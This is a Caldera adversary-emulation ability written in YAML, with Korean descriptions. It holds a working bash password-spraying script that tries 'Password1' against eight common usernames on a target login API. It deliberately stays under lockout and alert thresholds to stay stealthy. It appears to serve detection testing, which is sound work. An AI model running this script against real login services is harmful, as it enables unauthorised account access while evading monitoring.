- id: 11a2b3c4-5d6e-4789-8abc-def012345001
  name: Password Spraying - Single Password Across Multiple Users
  description: 하나의 흔한 비밀번호(Password1)를 여러 사용자명에 시도하는 Password Spraying. threshold 기반 탐지 룰을 의도적으로 회피하여 stealth 공격 패턴을 시뮬레이션합니다.
  tactic: credential-access
  technique:
    attack_id: T1110.003
    name: Brute Force - Password Spraying
  platforms:
    linux:
      sh:
        command: |-
          OP_ID="#{operation_id}"
          TECH_ID="T1110.003"
          ABILITY_ID="11a2b3c4-5d6e-4789-8abc-def012345001"
          TARGET="http://#{target.url}"

          USERNAMES=("admin" "administrator" "root" "user" "guest" \
                     "test" "operator" "support")
          COMMON_PASSWORD="Password1"

          echo "[*] Password Spraying 시작 — 비밀번호: ${COMMON_PASSWORD}"
          echo "[*] 대상 사용자 ${#USERNAMES[@]}명 (threshold 회피용 — 10회 미만)"
          echo "---"

          for USERNAME in "${USERNAMES[@]}"; do
            HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" \
              -H "X-Caldera-Op-Id: ${OP_ID}" \
              -H "X-Caldera-Technique: ${TECH_ID}" \
              -H "X-Caldera-Ability: ${ABILITY_ID}" \
              -A "Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}" \
              -H "Content-Type: application/json" \
              -X POST \
              -d "{\"username\": \"${USERNAME}\", \"password\": \"${COMMON_PASSWORD}\"}" \
              "${TARGET}/api/auth/login")

            echo "[>] ${USERNAME}:${COMMON_PASSWORD} → HTTP ${HTTP_CODE}"
            sleep 1
          done

          echo "[*] Spraying 완료 — threshold 룰 회피 여부 확인"
